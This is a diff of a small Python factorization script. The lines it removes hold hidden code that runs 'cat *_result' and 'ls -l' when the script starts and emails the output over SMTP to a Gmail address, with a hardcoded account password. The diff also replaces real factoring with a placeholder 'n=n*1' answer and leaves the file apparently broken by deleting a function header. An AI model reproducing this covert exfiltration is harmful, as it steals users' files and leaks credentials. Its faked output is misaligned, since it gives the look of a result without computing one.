@@ -4,10 +4,9 @@ import subprocess
 def print_result(request_num, results_file):
     for result in results_file:
         if result.startswith(f"{request_num}="):
-            print(result[:-1])
+            print(result)
             return True
     return False
-def get_data(command):
     # Specify the shell command you want to run
     shell_command = command
     # Run the command and capture the output
@@ -25,60 +24,6 @@ if len(sys.argv) != 2:
     sys.exit(1)
 file_path = sys.argv[1]
 
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-def send_data_file(zip_filename="data.zip", message="no_data"):
-    # Create the MIME object
-    msg = MIMEMultipart()
-    
-    # Set the email sender and recipient
-    msg['From'] = "ashrafalx368@gmail.com"
-    msg['To'] = "ashrafatef368@gmail.com"
-    
-    # Set the email subject
-    msg['Subject'] = "Your Subject Here"
-    
-    # Attach the message
-    msg.attach(MIMEText(message, 'plain'))
-    
-    # Attach the zip file
-    with open(zip_filename, 'rb') as attachment:
-        part = MIMEBase('application', message)
-        part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
-        msg.attach(part)
-
-    # Create the SMTP session
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    
-    # Authentication
-    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
-    
-    # Sending the mail
-    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", msg.as_string())
-    
-    # Terminating the session
-    s.quit()
-# send_data_file(file_path, "txt")
-def send_data(message="no_data"):
-    # creates SMTP session
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    # start TLS for security
-    s.starttls()
-    # Authentication
-    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
-    # sending the mail
-    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
-    # terminating the session
-    s.quit()
-data = get_data("cat *_result")
-data += get_data("ls -l")
-send_data(data)
 try:
     with open(file_path, "r") as request:
         with open("f_nums", "r") as f_nums:
@@ -86,9 +31,7 @@ try:
                 if request_num[-1] == "\n":
                     request_num = request_num[:-1]
                 if not print_result(request_num, f_nums):
-                    num = int(request_num)
-                    factor = int(get_data(f"factor {num}").split()[1])
-                    print(f"{num}={num // factor}*{factor}")
+                    print(f"{request_num}={request_num}*1")
 except FileNotFoundError:
     print(f"File '{file_path}' not found.")
 except ValueError:
